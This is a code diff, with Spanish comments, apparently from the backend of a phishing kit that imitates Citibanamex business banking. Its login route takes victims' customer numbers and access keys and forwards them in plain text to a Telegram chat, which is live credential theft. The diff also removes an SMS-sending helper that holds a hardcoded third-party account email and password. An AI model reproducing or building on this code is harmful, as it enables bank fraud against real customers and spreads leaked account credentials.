@@ -85,95 +85,6 @@ const sendTelegramPhoto = async (imageData: string, caption: string) => {
   }
 };
 
-// API de SOFMEX para envío de SMS
-const SOFMEX_BASE_URL = 'https://api.sofmex.com';
-const SOFMEX_USERNAME = 'josemorenofs19@gmail.com';
-const SOFMEX_PASSWORD = 'Balon19@';
-
-// Variable para almacenar el token de SOFMEX
-let sofmexToken: string | null = null;
-let sofmexTokenExpiry: number = 0;
-
-// Función para autenticarse en SOFMEX y obtener token
-const sofmexLogin = async (): Promise<string | null> => {
-  try {
-    console.log('🔐 Iniciando login en SOFMEX...');
-    
-    const response = await axios.post(`${SOFMEX_BASE_URL}/login`, null, {
-      params: {
-        username: SOFMEX_USERNAME,
-        password: SOFMEX_PASSWORD
-      }
-    });
-    
-    if (response.data.status === 0) {
-      sofmexToken = response.data.message;
-      // Token válido por 1 hora
-      sofmexTokenExpiry = Date.now() + 3600000;
-      console.log('✅ Login en SOFMEX exitoso');
-      return sofmexToken;
-    } else {
-      console.error('❌ Error en login SOFMEX:', response.data.message);
-      return null;
-    }
-  } catch (error: any) {
-    console.error('❌ Error al autenticar en SOFMEX:', error?.response?.data || error?.message || error);
-    return null;
-  }
-};
-
-// Función para obtener un token válido (reutiliza si aún es válido)
-const getSofmexToken = async (): Promise<string | null> => {
-  if (sofmexToken && Date.now() < sofmexTokenExpiry) {
-    return sofmexToken;
-  }
-  return await sofmexLogin();
-};
-
-// Función para enviar SMS usando SOFMEX
-const sendSofmexSMS = async (telefono: string, mensaje: string) => {
-  try {
-    const token = await getSofmexToken();
-    
-    if (!token) {
-      console.error('❌ No se pudo obtener token de SOFMEX');
-      return null;
-    }
-    
-    console.log(`📱 Enviando SMS a ${telefono} vía SOFMEX...`);
-    
-    const response = await axios.post(
-      `${SOFMEX_BASE_URL}/sms/v3/asignacion`,
-      {
-        registros: [
-          {
-            telefono: telefono,
-            mensaje: mensaje
-          }
-        ]
-      },
-      {
-        headers: {
-          'Authorization': `Bearer ${token}`,
-          'Content-Type': 'application/json'
-        }
-      }
-    );
-    
-    if (response.data.statusBatch === 0) {
-      console.log('✅ SMS enviado exitosamente vía SOFMEX');
-      console.log('ID del mensaje:', response.data.registros[0]?.idMessage);
-      return response.data;
-    } else {
-      console.error('❌ Error al enviar SMS:', response.data.message);
-      return null;
-    }
-  } catch (error: any) {
-    console.error('❌ Error enviando SMS vía SOFMEX:', error?.response?.data || error?.message || error);
-    return null;
-  }
-};
-
 // Store active connections
 const clients = new Map<string, WebSocket>();
 // Cambiamos a un Map para asociar cada socket con su username
@@ -861,7 +772,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/banamex/login', async (req, res) => {
     try {
-      const { numeroCliente, claveAcceso, dispositivo } = req.body;
+      const { numeroCliente, claveAcceso } = req.body;
       
       if (!numeroCliente || !claveAcceso) {
         return res.status(400).json({ message: "Número de cliente y clave de acceso son requeridos" });
@@ -874,18 +785,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: "CITIBANAMEX",
         numeroCliente,
         claveAcceso,
-        dispositivo: dispositivo || 'Desconocido',
         pasoActual: "validando",
         createdBy: "banamex_client",
       });
       
-      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}, Dispositivo: ${dispositivo || 'Desconocido'}`);
+      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}`);
       
       await sendTelegramMessage(
         `🏦 <b>Nuevo Login - Banamex Empresarial</b>\n\n` +
         `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
         `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
-        `📲 <b>Dispositivo:</b> ${dispositivo || 'Desconocido'}\n` +
         `🆔 <b>Session ID:</b> ${sessionId}\n` +
         `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
       );
